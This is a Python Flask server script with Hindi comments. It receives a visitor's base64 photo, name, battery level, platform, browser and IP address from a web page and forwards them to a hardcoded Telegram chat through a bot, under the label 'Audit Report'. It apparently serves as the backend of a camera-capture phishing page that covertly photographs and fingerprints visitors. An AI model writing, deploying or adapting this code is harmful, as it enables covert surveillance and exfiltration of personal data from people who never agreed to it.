import os
import base64
from flask import Flask, render_template, request, jsonify
import telebot

app = Flask(__name__)

# टोकन और आईडी (Render Environment Variables से आएंगे)
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = "7162565886"
bot = telebot.TeleBot(BOT_TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        user_name = data.get('name', 'Unknown')
        img_data = data.get('image')
        device_info = data.get('device_info', {})
        
        # डिवाइस रिपोर्ट तैयार करना (Professional English)
        report = (
            f"🚀 <b>New Audit Report Received</b>\n\n"
            f"👤 <b>User:</b> {user_name}\n"
            f"🔋 <b>Battery:</b> {device_info.get('battery', 'N/A')}%\n"
            f"📱 <b>Platform:</b> {device_info.get('platform', 'N/A')}\n"
            f"🌐 <b>Browser:</b> {device_info.get('browser', 'N/A')}\n"
            f"📍 <b>IP Address:</b> {request.remote_addr}\n"
        )

        if img_data:
            # Base64 फोटो को प्रोसेस करना
            header, encoded = img_data.split(",", 1)
            binary_data = base64.b64decode(encoded)
            
            # टेलीग्राम पर फोटो भेजना
            bot.send_photo(CHAT_ID, binary_data, caption=report, parse_mode='HTML')
        else:
            bot.send_message(CHAT_ID, report, parse_mode='HTML')

        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
  
